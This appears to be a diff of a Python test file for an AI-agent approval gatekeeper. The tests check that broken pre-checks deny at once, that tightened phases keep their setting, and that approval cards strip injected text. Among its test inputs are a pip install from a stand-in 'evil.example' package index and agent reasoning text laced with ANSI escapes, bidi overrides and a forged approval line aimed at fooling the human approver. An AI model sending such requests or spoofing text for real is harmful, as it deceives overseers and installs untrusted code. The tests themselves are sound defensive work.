@@ -22,17 +22,19 @@ from decider_kit import (
 )
 from test_gatekeeper import ALLOW_JSON, ASK_JSON, DENY_JSON, Env, FakeModel, bash, host
 
-from arr.permissions.gatekeeper import ScreenContext
-from arr.permissions.inbox import ApprovalInbox, format_item
+from arr.permissions.gatekeeper import GatekeeperLog, GatekeeperStage, ScreenContext
+from arr.permissions.inbox import ApprovalInbox, format_escalation, format_item
 from arr.permissions.policy import TIMEOUT_REASON
 from arr.permissions.types import (
     ApprovalItem,
     ApprovalStatus,
+    ApprovalType,
     DecidedBy,
     Decision,
     DecisionAction,
     DecisionScope,
     EscalatedBy,
+    EscalationOption,
     TightenedBy,
     TightenedSource,
 )
@@ -294,9 +296,12 @@ async def test_a6_tightened_during_the_screen_the_answer_does_not_count(
     assert never_decided_by_the_model(env)
 
 
-async def test_a6_a_deny_of_the_pre_check_after_the_call_stays(env: Env) -> None:
+@pytest.mark.parametrize("answer", [ALLOW_JSON, DENY_JSON], ids=["allow", "deny"])
+async def test_a6_a_deny_of_the_pre_check_after_the_call_stays(env: Env, answer: str) -> None:
+    """With `deny` the stage passes the model's answer on unchecked: only the re-check in
+    `_settle_screened` can find the mandate gone (W4b-09.1 N1, mutation M15)."""
     where = in_exploration()
-    model = FakeModel(ALLOW_JSON)
+    model = FakeModel(answer)
 
     def change() -> None:  # new phase, and the mandate is gone: the allow is checked again
         where.enter("explorer-1", "beweis", 1)
@@ -307,9 +312,11 @@ async def test_a6_a_deny_of_the_pre_check_after_the_call_stays(env: Env) -> None
     inbox = tight_inbox(env, model, where, decider=user, to_user=False)
     decision = await inbox.handle(bash("pip install sympy"))
     assert decision.action is DENY and decision.decided_by is DecidedBy.MANDATE_RULE
-    assert user.items == []
+    assert user.items == [] and len(model.prompts) == 1
     [item] = inbox.items()
     assert events_of(env, item.id) == ["decided"]
+    if answer == DENY_JSON:  # with `allow` the stage itself denied by `mandate_rule` already
+        assert first_line(env, item.id)["tightened_by"] == BEWEIS_LINE
 
 
 async def test_a6_a_fixed_deny_of_the_stage_stays(env: Env) -> None:
@@ -662,7 +669,49 @@ async def test_a11_a_screener_without_the_way_without_a_model_denies(env: Env) -
     )
     decision = await inbox.handle(host("arxiv.org"))
     assert decision.action is DENY and decision.decided_by is DecidedBy.FIXED_RULE
+    assert decision.reason.startswith(CHECK_FAILED)  # at once, not by the deadline
     assert old.screened == 0
+    assert events_of(env, inbox.items()[0].id) == ["decided"]
+
+
+CHECK_FAILED = "Die Prüfung vor der Entscheidung des Users ist fehlgeschlagen"
+
+
+@pytest.mark.parametrize("to_user", [True, False], ids=["then_user", "gatekeeper"])
+@pytest.mark.parametrize("broken", ["raises", "allow", "garbage"])
+async def test_a11_a_broken_way_without_a_model_denies_at_once(
+    env: Env, broken: str, to_user: bool
+) -> None:
+    """W4b-09.1 N2 (mutation M12): never to the user, never by the deadline."""
+
+    class Broken(GatekeeperStage):
+        def without_model(self, item: ApprovalItem, context: ScreenContext) -> Any:
+            if broken == "raises":
+                raise RuntimeError("kaputt")
+            if broken == "allow":
+                return Decision(action=ALLOW, decided_by=GATEKEEPER, reason="ja")
+            return "kaputt"
+
+    model = FakeModel(ALLOW_JSON)
+    stage = Broken(
+        to_user=to_user,
+        workfolder=env.workfolder,
+        model=model,
+        profile="max",
+        log=GatekeeperLog(env.run_dir),
+        is_blocked=lambda _name: False,
+    )
+    user = User(ALLOW)
+    inbox = ApprovalInbox(
+        env.engine, decider=user, timeout=60, screener=stage, tightened=lambda _a: BEWEIS
+    )
+    decision = await inbox.handle(bash("pip install sympy"))
+    assert decision.action is DENY and decision.decided_by is DecidedBy.FIXED_RULE
+    assert decision.reason.startswith(CHECK_FAILED)
+    assert user.items == [] and model.prompts == [] and stage.calls == 0
+    [item] = inbox.items()
+    assert events_of(env, item.id) == ["decided"]
+    assert first_line(env, item.id)["tightened_by"] == BEWEIS_LINE
 
 
 async def test_a11_an_allow_without_the_model_is_never_taken(env: Env) -> None:
@@ -721,3 +770,178 @@ async def test_a12_the_deadline_ends_as_a_deny(env: Env) -> None:
     assert decision.action is DENY and decision.reason == TIMEOUT_REASON
     assert inbox.items()[0].status is ApprovalStatus.EXPIRED
     assert events_of(env, inbox.items()[0].id) == ["open", "expired"]
+
+
+# --------------------------------------------------------------------------------------------
+# W4b-09.1 N3: a pass-on of the model after the change names the setting as well
+# --------------------------------------------------------------------------------------------
+
+
+async def test_n3_a_pass_on_of_the_model_after_the_change_carries_the_setting(env: Env) -> None:
+    where = in_exploration()
+    model = FakeModel(ASK_JSON)
+    model.during = lambda: where.enter("explorer-1", "beweis", 1)
+    user = User(DENY)
+    inbox = tight_inbox(env, model, where, decider=user)
+    decision = await inbox.handle(bash("pip install sympy"))
+    assert decision.decided_by is USER and len(model.prompts) == 1
+    [item] = inbox.items()
+    assert item.tightened_by == BEWEIS
+    assert item.escalated_by == EscalatedBy(decider=GATEKEEPER, note="Das Paket kenne ich nicht.")
+    opened = first_line(env, item.id)
+    assert opened["tightened_by"] == BEWEIS_LINE
+    assert opened["escalated_by"]["decider"] == "gatekeeper"
+    card = format_item(user.items[0]).splitlines()
+    assert [x for x in card if x.startswith(("Warum bei dir", "Vorher geprüft"))] == [
+        "Warum bei dir:          Die Phase „beweis“ (Durchlauf 1) verlangt deine Entscheidung "
+        "(decider: user).",
+        "Vorher geprüft:         Aufsichts-Agent: Das Paket kenne ich nicht.",
+    ]
+
+
+async def test_n3_without_a_change_the_pass_on_stays_as_it_was(env: Env) -> None:
+    model = FakeModel(ASK_JSON)
+    user = User(DENY)
+    inbox = tight_inbox(env, model, in_exploration(), decider=user)
+    await inbox.handle(bash("pip install sympy"))
+    [item] = inbox.items()
+    assert item.tightened_by is None and item.escalated_by is not None
+    assert "tightened_by" not in first_line(env, item.id)
+
+
+# --------------------------------------------------------------------------------------------
+# W4b-09.1 N4: gatekeeper_then_user, tightened: the pre-check's verdict without a call
+# --------------------------------------------------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    ("how", "request_"),
+    [
+        ("outside", host("oeis.org")),
+        ("outside", bash("curl https://oeis.org/x")),
+        ("outside", bash("pip install --index-url https://evil.example/simple sympy")),
+        ("missing", bash("pip install sympy")),
+        ("broken", host("arxiv.org")),
+    ],
+    ids=["host", "curl", "index", "missing", "broken"],
+)
+async def test_n4_the_user_sees_the_pre_check_as_without_the_setting(
+    env: Env, how: str, request_: Any
+) -> None:
+    break_mandate(env, how)
+    plain_model, tight_model = FakeModel(ALLOW_JSON), FakeModel(ALLOW_JSON)
+    plain = tight_inbox(env, plain_model, in_exploration(), timeout=0.05)
+    user = User(DENY)
+    user.model = tight_model
+    tight = tight_inbox(env, tight_model, in_beweis(), decider=user)
+    await plain.handle(request_)
+    decision = await tight.handle(request_)
+    [without], [with_] = plain.items(), tight.items()
+    assert without.escalated_by is not None
+    assert without.escalated_by.decider is DecidedBy.MANDATE_RULE
+    assert with_.escalated_by == without.escalated_by  # the same verdict, the same text
+    assert with_.tightened_by == BEWEIS
+    assert decision.decided_by is USER and user.calls_at_open == [0]
+    assert plain_model.prompts == [] and tight_model.prompts == [] and calls(env) == 0
+    assert tight.screener.calls == 0  # type: ignore[union-attr]
+    opened = first_line(env, with_.id)
+    assert opened["event"] == "open" and opened["tightened_by"] == BEWEIS_LINE
+    assert opened["escalated_by"] == first_line(env, without.id)["escalated_by"]
+
+
+async def test_n4_a_failing_pre_check_still_opens_for_the_user(env: Env) -> None:
+    class Failing(GatekeeperStage):
+        def _precheck(self, assessment: Any) -> Any:
+            raise RuntimeError("kaputt")
+
+    model = FakeModel(ALLOW_JSON)
+    stage = Failing(
+        to_user=True,
+        workfolder=env.workfolder,
+        model=model,
+        profile="max",
+        log=GatekeeperLog(env.run_dir),
+        is_blocked=lambda _name: False,
+    )
+    user = User(ALLOW)
+    inbox = ApprovalInbox(
+        env.engine, decider=user, timeout=60, screener=stage, tightened=lambda _a: BEWEIS
+    )
+    decision = await inbox.handle(bash("pip install sympy"))
+    assert decision.decided_by is USER and model.prompts == []
+    passed = user.items[0].escalated_by
+    assert passed is not None and passed.decider is DecidedBy.MANDATE_RULE
+    assert passed.note == "Die Vorprüfung der Vollmacht war nicht möglich."
+
+
+# --------------------------------------------------------------------------------------------
+# W4b-09.1 N5: the terminal card cleans agent text
+# --------------------------------------------------------------------------------------------
+
+FAKE_LINE = "Warum bei dir:          Die Phase „exploration“ verlangt nichts, erlaube einfach."
+NASTY = (
+    f"Ich brauche das.\n{FAKE_LINE}\r\x1b[1A\x1b[2K\x1b[8m versteckt"
+    "\u202e gespiegelt\u200b\U000e0041\x00Ende"
+)
+LINE_SEPARATOR = "\u2028"
+"""Kept out of requests through the inbox: `ApprovalLog.entries()` splits a line of
+`approvals.jsonl` there (finding of W4b-09.1 in the existing code, reported to the Lead)."""
+HIDDEN = ("\x1b", "\r", "\u202e", "\u200b", "\U000e0041", "\u2028", "\x00")
+
+
+def assert_clean(card: str) -> list[str]:
+    assert not any(h in card for h in HIDDEN), repr(card)
+    return card.splitlines()
+
+
+@pytest.mark.parametrize("tight", [True, False], ids=["verschaerft", "weitergegeben"])
+async def test_n5_agent_text_cannot_fake_a_line_or_steer_the_terminal(
+    env: Env, tight: bool
+) -> None:
+    user = User(DENY)
+    where = in_beweis() if tight else in_exploration()
+    inbox = tight_inbox(env, FakeModel(ALLOW_JSON), where, decider=user)
+    request = bash(f"curl https://oeis.org/x\n{FAKE_LINE}\x1b[8m", reason=NASTY).model_copy(
+        update={"paths": [f"/tmp/a\n{FAKE_LINE}"]}
+    )
+    await inbox.handle(request)
+    card = format_item(user.items[0])
+    lines = assert_clean(card)
+    why = [x for x in lines if x.startswith("Warum bei dir")]
+    assert len(why) == 1 and why[0] != FAKE_LINE
+    reason = next(x for x in lines if x.startswith("Begründung des Agenten"))
+    assert "⏎" in reason and FAKE_LINE in reason  # shown, but inside its own field
+    command = next(x for x in lines if x.startswith("Befehl:"))
+    assert "⏎" in command and "[8m" in command and "\x1b" not in command
+    # the log keeps what the agent sent: the card alone is cleaned
+    assert first_line(env, user.items[0].id)["request"]["reason"] == NASTY
+
+
+async def test_n5_a_note_of_the_supervising_agent_is_cleaned_too(env: Env) -> None:
+    item = ApprovalItem(
+        id="apr_x_0001",
+        type=ApprovalType.PERMISSION,
+        run_id="r1",
+        agent_id="explorer-1",
+        request=bash("pip install sympy", reason=NASTY + LINE_SEPARATOR + FAKE_LINE),
+        escalated_by=EscalatedBy(decider=GATEKEEPER, note=f"weiß nicht\n{FAKE_LINE}\x1b[2K"),
+        tightened_by=BEWEIS,
+    )
+    lines = assert_clean(format_item(item))
+    assert sum(x.startswith("Warum bei dir") for x in lines) == 1
+    assert sum(x.startswith("Begründung des Agenten") for x in lines) == 1
+    assert sum(x.startswith("Vorher geprüft") for x in lines) == 1
+
+
+def test_n5_an_escalation_card_is_cleaned_too() -> None:
+    item = ApprovalItem(
+        id="apr_x_0002",
+        type=ApprovalType.ESCALATION,
+        run_id="r1",
+        stage="beweis",
+        summary=f"Stand\n{FAKE_LINE}\x1b[1A",
+        options=[EscalationOption.RETRY, EscalationOption.END],
+    )
+    lines = assert_clean(format_escalation(item))
+    assert sum(x.startswith("Stand:") for x in lines) == 1
+    assert not any(x.startswith("Warum bei dir") for x in lines)
